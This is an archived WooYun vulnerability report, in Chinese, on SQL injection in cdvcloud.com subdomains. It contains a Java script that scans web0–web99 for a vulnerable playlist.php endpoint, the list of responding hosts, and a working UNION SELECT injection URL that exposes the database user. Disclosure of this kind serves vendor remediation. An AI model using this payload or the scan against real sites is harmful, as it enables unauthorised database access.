{"id": 67909, "wybug_id": "wooyun-2015-0142963", "wybug_title": "云视多站点存在通用SQL注入漏洞（修复不完善附带java检测网站响应小脚本）", "wybug_corp": "cdvcloud.com", "wybug_author": "❤", "wybug_date": "2015-09-23 14:22", "wybug_open_date": "2015-11-07 16:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向公众公开  简要描述： * 详细说明：  看到之前的这个漏洞 \n WooYun: 云视某处SQL注入导致后台getshell \n 只修复了web2,其他地址都没修复于是修改了下地址发现原来子域很多这样的站,貌似是客户的站吧,然后统一管理. 于是写了JAVA小脚本批量下了：\nimport java.net.*;public class 批量查询网页打开状态 {\tInetAddress myIPaddress=null;\tstatic InetAddress myServer=null;\t/** * @param args */\tpublic static void main(String[] args) { \t\tfor (int i = 0; i < 100; i++) {\t\t\tString url=\"http://web\"+i+\".cdvcloud.com/e/extend/live/playlist.php?id=1\";\t\t\thttpcode(url); \t\t\t} } \t/** * 批量获取HTTP响应 * @param surl */\tpublic static void httpcode(String surl){ \t\ttry {\t\t\tURL url = new URL(surl);\t\tURLConnection rulConnection = url.openConnection();\t\tHttpURLConnection httpUrlConnection = (HttpURLConnection) rulConnection; \t\thttpUrlConnection.setConnectTimeout(300000); httpUrlConnection.setReadTimeout(300000);\t\thttpUrlConnection.connect(); \t\tString code = new Integer(httpUrlConnection.getResponseCode()).toString(); \t\tString message = httpUrlConnection.getResponseMessage();\t\t System.out.println( code); \t\t if(!code.startsWith(\"2\")){ \t\t\t throw new Exception(\"ResponseCode is not begin with 2,code=\"+code);\t\t\t } \t\t String ipurl=surl.split(\"http://\")[1].toString(); \t\t System.out.println(surl+\" \"+code); \t\t }catch(Exception ex){ \t\t\t System.out.println(surl+\" \"+\"无法访问\"); \t\t\t } \t\t\t} }\n得到可访问地址： \n404http://web0.cdvcloud.com/e/extend/live/playlist.php?id=1 无法访问404http://web1.cdvcloud.com/e/extend/live/playlist.php?id=1 无法访问200http://web2.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web3.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web4.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web5.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web6.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web7.cdvcloud.com/e/extend/live/playlist.php?id=1 200http://web8.cdvcloud.com/e/extend/live/playlist.php?id=1 无法访问200http://web9.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web10.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web11.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web12.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web13.cdvcloud.com/e/extend/live/playlist.php?id=1 200200http://web14.cdvcloud.com/e/extend/live/playlist.php?id=1 200\n    漏洞证明：  以web13为例手注一下:\nhttp://web13.cdvcloud.com/e/extend/live/playlist.php?id=1%20and%201=2%20union%20select%201,2,3,user(),5,6\n直接爆数据库:\ndocument.write('08:00  root@localhost');\n其他的都同样存在该问题.   修复方案：  **   版权声明：转载请注明来源 ❤@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-09-23 16:11 厂商回复： 测试系统 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}